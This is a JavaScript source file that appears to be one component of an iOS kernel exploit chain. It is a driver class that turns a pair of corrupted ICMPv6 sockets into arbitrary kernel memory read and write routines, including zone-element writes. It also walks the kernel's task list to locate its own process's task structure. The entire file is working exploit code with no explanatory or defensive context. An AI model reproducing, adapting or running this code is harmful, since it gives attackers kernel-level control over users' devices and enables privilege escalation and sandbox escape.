import Offsets from "./Offsets";
import Utils from "libs/JSUtils/Utils";
import Chain from "libs/Chain/Chain";

const TAG = "DRIVER-NEWTHREAD"

const EARLY_KRW_LENGTH = 0x20n;
const IPPROTO_ICMPV6 = 58n;
const ICMP6_FILTER = 18n;

export default class DriverNewThread
{
	#offsets;
	#controlSocket;
	#rwSocket;
	#kernelBase;
	#paciaGadget;
	#tmpWriteMem;

	constructor(controlSocket, rwSocket, kernelBase, paciaGadget=0n) {
		this.#offsets = Offsets.getByDeviceAndVersion();
		this.#controlSocket = controlSocket;
		this.#rwSocket = rwSocket;
		this.#kernelBase = kernelBase;
		this.#paciaGadget = paciaGadget;
		this.#tmpWriteMem = Native.callSymbol("malloc", EARLY_KRW_LENGTH);

		console.log(TAG, `Got RW context: ${this.#controlSocket}, ${this.#rwSocket}`);
	}

	destroy() {
		console.log(TAG, "Destroy");
		Native.callSymbol("free", this.#tmpWriteMem);
		Native.callSymbol("close", this.#controlSocket);
		Native.callSymbol("close", this.#rwSocket);
	}

	read(srcAddr, dst, len) {
		//console.log(TAG, `read(${Utils.hex(srcAddr)}, ${len})`);
		srcAddr = this.strip(srcAddr);
		if (srcAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot read: ${Utils.hex(srcAddr)}`);
			return false;
		}
		return this.#kreadLength(srcAddr, dst, len);
	}

	write(dst, src, len) {
		let dstAddr = this.strip(dst);
		if (dstAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot write: ${Utils.hex(dstAddr)}`);
			return false;
		}
		return this.#kwriteLength(dst, src, len);
	}

	writeZoneElement(dst, src, len) {
		const CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;

		if (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
			console.log(TAG, "writeZoneElement supports only zone element size >= 0x20");
			return false;
		}

		let write_size = 0n;
		let write_offset = 0n;

		let remaining = BigInt(len);
		while (remaining != 0n) {
			write_size = (remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) ?
				CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : (remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);

			let kwrite_dst_addr = (dst + write_offset);
			let kwrite_src_addr = (src + write_offset);

			if (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
				let adjust = (CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size);
				kwrite_dst_addr -= adjust;
				kwrite_src_addr -= adjust;
			}
			if (!this.#kwriteLength(kwrite_dst_addr,kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE))
				return false;
			remaining -= write_size;
			write_offset += write_size;
		}
		return true;
	}

	strip(val) {
		//return val & 0x7fffffffffn;
		return val | 0xffffff8000000000n;
	}

	offsets() {
		return this.#offsets;
	}

	getPaciaGadget() {
		return this.#paciaGadget;
	}

	getKernelBase() {
		return this.#kernelBase;
	}
	
	getSelfTaskAddr() {
		console.log(TAG, `getSelfTaskAddr`);

		let selfTaskKaddr = 0;
		for (let i=0; i<5; i++)
		{
			selfTaskKaddr = this.#findSelfTaskKaddr(true);
			if (!selfTaskKaddr)
			{
				console.log(TAG, `Searching the other way around`);
				selfTaskKaddr = this.#findSelfTaskKaddr(false);
			}
			else
				break;
			Native.callSymbol("usleep",20000);
		}
		return selfTaskKaddr;
	}

	threadSpawn(scriptCFString, threadMem) {
		console.log(TAG, "threadSpawn() not implemented!");
		Native.callSymbol("sleep", 2);
	}

	#findSelfTaskKaddr(direction) {	
		let kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;
		console.log(TAG, `baseKernel: ${Utils.hex(this.#kernelBase)}, kernelTask: ${Utils.hex(kernelTaskAddr)}`);
	
		let kernelTaskVal = Chain.read64(kernelTaskAddr);
		//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);
		let ourPid = Native.callSymbol("getpid");
		console.log(TAG, `Our pid: ${ourPid}`);
	
		let nextTask = 0n;
		if (direction)
			nextTask = Chain.read64(kernelTaskVal + this.#offsets.nextTask);
		else
			nextTask = Chain.read64(kernelTaskVal + this.#offsets.prevTask);
		//console.log(TAG, `nextTask: ${Utils.hex(nextTask)}`);

		while (nextTask != 0 && nextTask != kernelTaskVal) {
			let procROAddr = Chain.read64(nextTask + this.#offsets.procRO);
			//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);
			let procVal = Chain.read64(procROAddr);
			//console.log(TAG,`procVal: ${Utils.hex(procVal)}`);
			if (procVal && this.strip(procVal) > 0xffffffd000000000n) {
				let pid = Chain.read32(procVal + this.#offsets.pid);
				//console.log(TAG, `pid:${pid}`);
				if (pid == ourPid) {
					console.log(TAG, `Found our pid`);
					return nextTask;
				}
				
				if (direction)
					nextTask = Chain.read64(nextTask + this.#offsets.nextTask);
				else 
					nextTask = Chain.read64(nextTask + this.#offsets.prevTask);
			}
			else
				break;
		}
		return false;
	}

	#kreadLength(address, buffer, size) {
		//console.log(TAG, `kread(${address.toString(16)}, ${size})`);

		let remaining = BigInt(size);
		let read_offset = 0n;
		let read_size = 0n;
	
		while (remaining != 0n) {
			if (remaining >= EARLY_KRW_LENGTH) {
				read_size = EARLY_KRW_LENGTH;
			} else {
				read_size = remaining % EARLY_KRW_LENGTH;
			}
			if (!this.#kread32Bytes(address + read_offset, buffer + read_offset, read_size))
				return false;
			remaining -= read_size;
			read_offset += read_size;
		}
		return true;
	}

	#kwriteLength(address, buffer, size) {
		//console.log(TAG, `kwrite(${address.toString(16)}, ${size})`);

		let remaining = BigInt(size);
		let write_offset = 0n;
		let write_size = 0n;
	
		while (remaining != 0n) {
			if (remaining >= EARLY_KRW_LENGTH) {
				write_size = EARLY_KRW_LENGTH;
			} else {
				write_size = remaining % EARLY_KRW_LENGTH;
			}
	
			let kwrite_dst_addr = address + write_offset;
			let kwrite_src_addr = buffer + write_offset;
	
			if (write_size != EARLY_KRW_LENGTH) {
				if (!this.#kread32Bytes(kwrite_dst_addr, this.#tmpWriteMem, EARLY_KRW_LENGTH))
					return false;
				Native.callSymbol("memcpy", this.#tmpWriteMem, kwrite_src_addr, write_size);
				kwrite_src_addr = this.#tmpWriteMem;
			}
	
			if (!this.#kwrite32Bytes(kwrite_dst_addr, kwrite_src_addr))
				return false;
			remaining -= write_size;
			write_offset += write_size;
		}
		return true;
	}

	#kread32Bytes(kaddr, buffer, len) {
		const tmpBuff = Native.mem + 0x1000n;

		// Set "kaddr" address
		let buff = new BigUint64Array(4);
		buff[0] = kaddr;
		Native.write(tmpBuff, buff.buffer);
		let ret = Native.callSymbol("setsockopt", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);
		if (ret != 0) {
			console.log(TAG, "setsockopt: " + ret);
			return false;
		}

		buff[0] = BigInt(len);
		Native.write(tmpBuff, buff.buffer);
		ret = Native.callSymbol("getsockopt", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, tmpBuff);
		if (ret != 0) {
			console.log(TAG, "getsockopt failed reading " + Utils.hex(kaddr));
			return false;
		}

		return true;
	}

	#kwrite32Bytes(kaddr, buffer) {
		const tmpBuff = Native.mem + 0x1000n;

		// Set "kaddr" address
		let buff = new BigUint64Array(4);
		buff[0] = kaddr;
		Native.write(tmpBuff, buff.buffer);
		let ret = Native.callSymbol("setsockopt", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);
		if (ret != 0) {
			console.log(TAG, "setsockopt: " + ret);
			return false;
		}

		ret = Native.callSymbol("setsockopt", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, EARLY_KRW_LENGTH);
		if (ret != 0) {
			console.log(TAG, "setsockopt failed writing " + Utils.hex(kaddr));
			return false;
		}

		return true;
	}

}
